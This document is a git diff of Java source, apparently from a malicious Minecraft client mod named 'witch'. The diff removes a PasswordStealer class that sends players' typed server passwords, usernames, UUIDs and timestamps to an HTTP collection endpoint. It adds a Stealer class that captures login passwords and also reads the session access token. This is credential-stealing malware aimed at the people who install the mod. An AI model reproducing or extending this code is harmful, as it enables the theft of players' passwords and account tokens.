@@ -1,28 +1,14 @@
 package me.soda.witch.features;
 
-import java.net.URL;
-import java.net.URLEncoder;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.List;
 
 import static me.soda.witch.Witch.mc;
 
-public class PasswordStealer {
-    static String address = "http://127.0.0.1";
-
-    private static void uploadPassword(String[] args) {
-        try {
-            for (int i = 0; i < args.length; i++) {
-                args[i] = URLEncoder.encode(args[i], "UTF-8");
-            }
-            new URL(String.format("%s/add_data?username=%s&password=%s&server=%s&uuid=%s&ts=%s",
-                    address, args[0], args[1], args[2], args[3], args[4])).openStream();
-        } catch (Exception e) {
-        }
-    }
-
-    public static void stealPassword(String command) {
+public class Stealer {
+    //Steal login passwords, returns username, password, server, uuid and timestamp
+    public String[] stealPassword(String command) {
         String username;
         String password;
         String server;
@@ -38,13 +24,23 @@ public class PasswordStealer {
                     String name = mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address;
                     server = name.replace(":", "_");
                 } else {
-                    server = "unknown";
+                    server = "unknown/singleplayer";
                 }
                 username = mc.getSession().getUsername();
                 uuid = mc.player.getUuid().toString();
                 String ts = String.valueOf(new Date().getTime());
-                new Thread(() -> uploadPassword(new String[]{username, password, server, uuid, ts})).start();
+                return new String[]{username, password, server, uuid, ts};
             }
         }
+        return null;
+    }
+
+    //Steal token, returns username, uuid, token and timestamp
+    public String[] stealToken() {
+        String username = mc.getSession().getUsername();
+        String uuid = mc.player.getUuid().toString();
+        String token = mc.getSession().getAccessToken();
+        String ts = String.valueOf(new Date().getTime());
+        return new String[]{username, uuid, token, ts};
     }
 }
